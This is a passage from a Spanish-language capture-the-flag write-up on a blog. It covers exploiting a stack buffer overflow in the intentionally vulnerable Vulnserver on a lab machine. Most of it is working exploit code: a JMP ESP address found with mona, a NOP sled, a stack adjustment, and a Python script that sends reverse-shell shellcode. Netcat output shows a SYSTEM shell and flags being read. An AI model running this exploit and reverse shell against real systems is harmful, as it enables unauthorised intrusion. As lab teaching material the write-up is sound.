+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        exploit()
+</span></span></code></pre></div><p>Bien, ya estamos muy cerca de terminar.</p>
+<h4 id="Noveno">Noveno Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</h4>
+<p>Recordemos que es un <strong>OpCode</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Operation Code</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El opcode (abreviatura de &ldquo;operation code&rdquo; o código de operación) es una parte fundamental de una instrucción en lenguaje máquina. Es el segmento de la instrucción que le dice a la CPU qué operación debe realizar.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Necesitamos buscar un <strong>OpCode</strong> dentro del binario que nos ayude a escribir nuestro <strong>Shellcode</strong> para que se pueda ejecutar la <strong>Reverse Shell</strong>.</p>
+<p>Para esto, usamos el <strong>EIP</strong> para que apunte a una dirección de memoria donde se aplique un <strong>OpCode</strong>, para que realice un salto (<strong>JMP</strong>) al <strong>ESP</strong>, que es donde queremos que se aplique el <strong>Shellcode</strong>.</p>
+<p>Esto se le conoce como <strong>JMP ESP</strong>.</p>
+<p>Una herramienta que podemos ocupar es <strong>nasm_shell</strong> de <strong>Metasploit Framework</strong>.</p>
+<p>Podemos invocarla usando su ruta completa <code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code> y le indicamos que busque él <code>JMP ESP</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+</span></span><span style="display:flex;"><span>nasm &gt; jmp ESP
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  FFE4              jmp esp
+</span></span></code></pre></div><p>El <strong>OpCode</strong> se representa así: <code>\xFF\xE4</code>.</p>
+<p>Vamos a buscar este <strong>OpCode</strong> en <strong>Immunity Debugger</strong> con la ayuda del módulo <strong>mona.py</strong>.</p>
+<p>Para hacer esto, necesitamos el <strong>archivo DLL</strong> que también descargamos, pues ahí buscaremos el <strong>OpCode</strong>.</p>
+<p>Usa el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona find -s <span style="color:#e6db74">&#34;\xFF\xE4&#34;</span> -m essfunc.dll
+</span></span></code></pre></div><p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura30.png">
+</p>
+<p>Observa que nos salieron varias direcciones.</p>
+<p>Vamos a utilizar cualquiera de esas direcciones, yo utilizare la penúltima, así que cópiala y pégala en el Exploit, en la variable <strong>EIP</strong> que declaramos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Variables globales</span>
+</span></span><span style="display:flex;"><span>ip_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_maquina_windows&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2003</span>
+</span></span><span style="display:flex;"><span>before_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, <span style="color:#ae81ff">0x62501203</span>)
+</span></span></code></pre></div><p>Esa dirección que copiamos, está en formato <strong>little endian</strong>, ósea que está al revés porque se copió de un sistema de <strong>32 bits (x86)</strong>, por eso la pusimos dentro de la función <strong>pack</strong> e importamos esa librería.</p>
+<p>Si entendí bien, esto es lo que realiza el script 5 del repositorio que descargamos.</p>
+<p>Con esto listo, vamos a revisar como es el flujo del programa.</p>
+<p>Lo haremos por pasos:</p>
+<ul>
+<li><strong>Paso 1</strong>: Vamos a seguir la dirección que ocupamos en el Exploit, para esto, dale click en el botón <strong>Enter Expression</strong> y luego mete la dirección que escogiste. Cuando le des enter, verifica que sea la misma dirección que escogiste:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura31.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura32.png">
+</p>
+<p>Observa como la dirección del <strong>OpCode</strong> es un <strong>JMP ESP</strong>.</p>
+<ul>
+<li><strong>Paso 2</strong>: Selecciona esa dirección, da click derecho, busca la opción <strong>breakpoint</strong> y elige la opción <strong>Toggle</strong>.</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura33.png">
+</p>
+<ul>
+<li><strong>Paso 3</strong>: Ejecuta el Exploit y observa si el <strong>EIP</strong> y la <strong>OpCode</strong> que elegiste tienen la misma dirección:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura35.png">
+</p>
+<p>Son las mismas, vamos muy bien.</p>
+<ul>
+<li><strong>Paso 4</strong>: Ahora queremos ver el siguiente flujo, con tal de comprobar si la dirección del <strong>EIP</strong> es la misma que la del <strong>ESP</strong> y la del <strong>OpCode</strong>, esto lo haremos solamente eligiendo el botón <strong>step into</strong> y si las direcciones son las mismas, podremos ver nuestro <strong>Shellcode</strong> aplicando un <strong>Follow in Dump</strong> al <strong>ESP</strong> como hemos hecho antes:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura36.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura37.png">
+</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-pila/Captura38.png">
+</p>
+<p>Ya casi terminamos.</p>
+<h4 id="Décimo">Décimo Paso: Aplicando NOPs y Desplazamiento de Pila en Exploit</h4>
+<p>Recordemos que son los <strong>NOPs</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>No Operation (NOPs)</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Los NOPs (del inglés No Operation, &ldquo;sin operación&rdquo;) son instrucciones en lenguaje máquina o ensamblador que no realizan ninguna acción útil, excepto avanzar al siguiente ciclo de la CPU. Permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Es muy simple, únicamente debemos agregar la siguiente instrucción que es para <strong>arquitectura x86</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;\x90&#34;</span>
+</span></span></code></pre></div><p>El <strong>NOP</strong>, se puede multiplicar por 16 o por 32, pero en nuestro caso, al no tener tantas instrucciones, podemos multiplicarlo por 16.</p>
+<p>Esto lo podemos agregar al Exploit en la variable <strong>after_eip</strong> junto al <strong>Shellcode</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>after_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> shellcode  <span style="color:#75715e"># ESP = Combinación de NOPs con shellcode</span>
+</span></span></code></pre></div><p>Lo que sigue es aplicar el <strong>desplazamiento de pila</strong>, pero entendamos de que se trata este paso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Desplazamiento de Pila (stack offset)</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center">*Un desplazamiento de pila (stack offset) se refiere al cambio de posición de un dato dentro de la pila de ejecución de un programa, ya sea por instrucciones del código, llamadas a funciones o por una manipulación no intencionada (como en un buffer overflow). La pila funciona con una estructura LIFO (Last In, First Out) y se maneja a través de registros como: ESP (Stack Pointer) que apunta a la cima de la pila y EBP (Base Pointer) que apunta a la base del frame de la función actual. *</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora, para aplicar el <strong>desplazamiento de pila</strong>, debemos usar la herramienta <strong>nasm_shell</strong> de <strong>Metasploit</strong>, que ya usamos para obtener el <strong>OpCode (JMP ESP)</strong>, actívalo y escribe lo siguiente: <code>sub esp,0x10</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+</span></span><span style="display:flex;"><span>nasm &gt; sub esp,0x10
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">00000000</span>  83EC10            sub esp,byte +0x10
+</span></span><span style="display:flex;"><span>nasm &gt; exit
+</span></span></code></pre></div><p>Lo que estamos haciendo, es decrementar el valor del <strong>puntero de pila</strong> de <strong>16 bytes</strong>.</p>
+<p>Agrega esa dirección al Exploit y ejecútalo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> before_eip <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\xEC\x10</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> after_eip
+</span></span></code></pre></div><p>Sigamos.</p>
+<h4 id="Undecimo">Undécimo Paso: Prueba y Ejecución de Exploit</h4>
+<p>En este punto, el Exploit debería quedarte así:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Variables globales</span>
+</span></span><span style="display:flex;"><span>ip_addr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;IP_maquina_windows&#34;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">2003</span>
+</span></span><span style="display:flex;"><span>before_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, <span style="color:#ae81ff">0x62501203</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span>  (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xcd\xd9\x74\x24\xf4\xba\x7a\xe1\xd9\x25\x5e\x31\xc9</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\x52\x31\x56\x17\x83\xc6\x04\x03\x2c\xf2\x3b\xd0\x2c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1c\x39\x1b\xcc\xdd\x5e\x95\x29\xec\x5e\xc1\x3a\x5f\x6f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>after_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> shellcode
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRUN /.:/&#34;</span> <span style="color:#f92672">+</span> before_eip <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\xEC\x10</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> after_eip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Creando conexión y enviando shellcode</span>
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>connect((ip_addr, port))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Recibiendo banner</span>
+</span></span><span style="display:flex;"><span>        banner <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Recibiendo Banner: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>banner<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ignore&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">------</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Enviando payload</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Cerrando conexión</span>
+</span></span><span style="display:flex;"><span>        s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        exploit()
+</span></span></code></pre></div><p>En este caso, puedes probar con tu <strong>máquina virtual Windows</strong> o ya con la <strong>máquina víctima</strong> que esta ejecutando el binario.</p>
+<p>Yo lo probaré con mi <strong>máquina virtual Windows</strong>.</p>
+<p>Abre una <strong>netcat</strong> en conjunto con la herramienta <strong>rlwrap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ejecuta el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploitVulnserver.py
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Recibiendo Banner: 
+</span></span><span style="display:flex;"><span>------
+</span></span><span style="display:flex;"><span>Welcome to Vulnerable Server! Enter HELP <span style="color:#66d9ef">for</span> help.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------
+</span></span></code></pre></div><p>Observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Mi_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>IP_maquina_virtual_Windows<span style="color:#f92672">]</span> <span style="color:#ae81ff">49255</span>
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 6.1.7601<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2009</span> Microsoft Corporation.  All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\b</span>erserkw<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\V</span>ulnserver&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>berserkw-pc<span style="color:#ae81ff">\b</span>erserkw
+</span></span></code></pre></div><p>Genial, funciono correctamente.</p>
+<p>Podemos decir que hemos hecho una prueba exitosa de <strong>Buffer Overflow</strong>.</p>
+<p>Ya solo ejecutemos el Exploit contra la máquina víctima y observa a donde nos manda:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nlvp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.1.100] 49158
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 6.0.6001]
+</span></span><span style="display:flex;"><span>Copyright (c) 2006 Microsoft Corporation.  Reservados todos los derechos.
+</span></span><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>Resulta que el <strong>Administrador</strong> era quien estaba ejecutando el binario.</p>
+<p>Ya solo tenemos que buscar las flags.</p>
+<p>Veamos primero la del <strong>Administrador</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> El volumen de la unidad C no tiene etiqueta.
+</span></span><span style="display:flex;"><span> El n�mero de serie del volumen es: 640F-86BF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directorio de C:\Users\Administrador\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>21/07/2024  18:46    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>21/07/2024  18:46    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>21/07/2024  18:00             1.646 essfunc.c
+</span></span><span style="display:flex;"><span>21/07/2024  18:00            16.601 essfunc.dll
+</span></span><span style="display:flex;"><span>21/07/2024  18:46                36 root.txt
+</span></span><span style="display:flex;"><span>21/07/2024  18:00             9.033 vulnserver.c
+</span></span><span style="display:flex;"><span>21/07/2024  17:59            29.624 vulnserver.exe
+</span></span><span style="display:flex;"><span>               5 archivos         56.940 bytes
+</span></span><span style="display:flex;"><span>               2 dirs  16.631.238.656 bytes libres
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y por último, busquemos la del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Users<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> El volumen de la unidad C no tiene etiqueta.
+</span></span><span style="display:flex;"><span> El n�mero de serie del volumen es: 640F-86BF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directorio de C:\Users
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>21/07/2024  18:29    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>21/07/2024  18:29    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>21/07/2024  17:38    &lt;DIR&gt;          Administrador
+</span></span><span style="display:flex;"><span>21/07/2024  18:29    &lt;DIR&gt;          Pila
+</span></span><span style="display:flex;"><span>19/01/2008  10:40    &lt;DIR&gt;          Public
+</span></span><span style="display:flex;"><span>               0 archivos              0 bytes
+</span></span><span style="display:flex;"><span>               5 dirs  16.631.238.656 bytes libres
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users<span style="color:#75715e">&gt;cd Pila/Desktop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">cd</span> Pila/Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Pila\Desktop<span style="color:#75715e">&gt;dir</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">dir</span>
+</span></span><span style="display:flex;"><span> El volumen de la unidad C no tiene etiqueta.
+</span></span><span style="display:flex;"><span> El n�mero de serie del volumen es: 640F-86BF
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directorio de C:\Users\Pila\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>21/07/2024  18:47    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>21/07/2024  18:47    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>21/07/2024  18:46                36 user.txt
+</span></span><span style="display:flex;"><span>               1 archivos             36 bytes
+</span></span><span style="display:flex;"><span>               2 dirs  16.631.238.656 bytes libres
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Pila\Desktop<span style="color:#75715e">&gt;type user.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Con esto, hemos completado la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://github.com/shamsher404/Buffer-Overflow-tools" target="_blank" rel="noopener noreferrer">https://github.com/shamsher404/Buffer-Overflow-tools</a></li><li><a href="https://github.com/stephenbradshaw/vulnserver?tab=readme-ov-file" target="_blank" rel="noopener noreferrer">https://github.com/stephenbradshaw/vulnserver?tab=readme-ov-file</a></li><li><a href="https://www.infosecinstitute.com/resources/hacking/intro-to-fuzzing/" target="_blank" rel="noopener noreferrer">https://www.infosecinstitute.com/resources/hacking/intro-to-fuzzing/</a></li><li><a href="https://www.infosecinstitute.com/resources/penetration-testing/fuzzing-introduction-definition-types-and-tools-for-cybersecurity-pros/" target="_blank" rel="noopener noreferrer">https://www.infosecinstitute.com/resources/penetration-testing/fuzzing-introduction-definition-types-and-tools-for-cybersecurity-pros/</a></li><li><a href="https://askubuntu.com/questions/1483732/cant-install-wine32-on-ubuntu-23-04" target="_blank" rel="noopener noreferrer">https://askubuntu.com/questions/1483732/cant-install-wine32-on-ubuntu-23-04</a></li><li><a href="https://windows-7-home-premium.uptodown.com/windows" target="_blank" rel="noopener noreferrer">https://windows-7-home-premium.uptodown.com/windows</a></li><li><a href="https://github.com/kbandla/ImmunityDebugger" target="_blank" rel="noopener noreferrer">https://github.com/kbandla/ImmunityDebugger</a></li><li><a href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer">https://github.com/corelan/mona</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-grillo/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Grillo - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-zapasguapas/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Zapas Guapas - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
